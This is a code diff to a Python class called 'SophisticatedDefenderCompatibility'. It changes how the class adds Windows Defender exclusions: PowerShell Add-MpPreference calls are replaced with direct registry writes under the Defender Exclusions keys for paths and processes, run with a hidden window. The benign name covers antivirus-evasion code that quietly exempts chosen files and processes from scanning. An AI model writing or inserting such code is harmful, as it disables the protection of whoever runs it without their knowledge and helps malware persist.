@@ -78,13 +78,24 @@ class SophisticatedDefenderCompatibility:
 
     def _add_exclusion(self, param: str, value: str):
         try:
-            cmd = f'Add-MpPreference -{param} "{value}" -ErrorAction SilentlyContinue'
-            r = subprocess.run(
-                ['powershell', '-NoProfile', '-NonInteractive',
-                 '-Command', cmd],
-                capture_output=True, timeout=15,
-                creationflags=_NO_WIN,
-            )
+            # Use registry instead of PowerShell
+            if param == 'ExclusionPath':
+                reg_path = 'HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths'
+                safe_name = value.replace('\\', '_').replace(':', '').replace(' ', '_')[:100]
+                r = subprocess.run(
+                    ['reg', 'add', reg_path, '/v', safe_name, '/t', 'REG_SZ', '/d', value, '/f'],
+                    capture_output=True, timeout=15, creationflags=_NO_WIN
+                )
+            elif param == 'ExclusionProcess':
+                reg_path = 'HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes'
+                safe_name = value.replace('\\', '_').replace(':', '').replace(' ', '_')[:100]
+                r = subprocess.run(
+                    ['reg', 'add', reg_path, '/v', safe_name, '/t', 'REG_SZ', '/d', value, '/f'],
+                    capture_output=True, timeout=15, creationflags=_NO_WIN
+                )
+            else:
+                r = type('obj', (object,), {'returncode': 1})()
+            
             self._results.append(ExclusionEntry(
                 exclusion_type=param, value=value,
                 success=r.returncode == 0,
